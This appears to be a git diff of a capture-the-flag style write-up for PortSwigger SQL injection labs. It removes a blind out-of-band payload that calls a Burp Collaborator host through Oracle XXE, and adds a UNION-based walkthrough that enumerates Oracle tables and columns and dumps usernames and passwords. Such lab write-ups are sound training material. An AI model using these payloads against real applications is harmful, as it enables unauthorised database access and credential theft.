@@ -1,22 +1,45 @@
 
-### Blind SQL injection with out-of-band interaction : PRACTITIONER
+### SQL injection attack, listing the database contents on Oracle
 
 ---
 
-> Since the application executes the SQL asynchronously and has no effect on the application response, we can try and trigger and out of band network interaction.
+First, identify the number of output fields in the query. Do that using the adding `NULL` method. It is an oracle DB, so must add `FROM DUAL`.
 
-> Capturing a `GET` request using BURPSUITE PROXY HTTP history, we see the `TrackingId` cookie that is vulnerable.
-
-![](./screenshots/lab17-1.png)
-
->  Opening the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and trying the different out of band payloads and placing them in the `TrackingId` cookie with the burp collaborator domain.
 ```
-x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://oa2ta7v39e81tpe1t3gofuf07rdi19py.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+' UNION SELECT NULL, NULL FROM DUAL--
 ```
-> Should be URL encoded, and uses the `http://` protocol.
+- It has 2 output fields.
 
-> Opening collaborator and polling we see the following DNS requests, confirming that we executed SQL statements.
+Next, we determine the type of the output fields. We need to extract a username and a password, so we are looking for text type string.
+```
+' UNION SELECT 'a', NULL FROM DUAL-- 
+' UNION SELECT NULL, 'a' FROM DUAL--
+```
+- Both work, hence both are strings.
 
-![](./screenshots/lab17-2.png)
+Since this is oracle, we can use `all_tables` to enumerate the tables of this database.
+```
+' UNION SELECT TABLE_NAME, NULL FROM all_tables --
+```
+- Choosing to attack the `USERS_QTKCOM` table.
+
+We need to find the column names of this table to check that they are indeed the usernames and passwords as required.
+```
+' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_QTKCOM' --
+```
+
+2 new rows were output that contain the column name for usernames and passwords.
+* PASSWORD_TMVXQH
+* USERNAME_SITQKU
+
+Now, we need to get the data inside these columns using a normal query
+```
+' UNION SELECT USERNAME_SITQKU, PASSWORD_TMVXQH FROM USERS_QTKCOM --
+```
+- This outputs the usernames and passwords in new rows.
+
+![usersandpass](./screenshots/usernamepass.png)
+
+We can now login as admin and complete the lab.
 
 ---
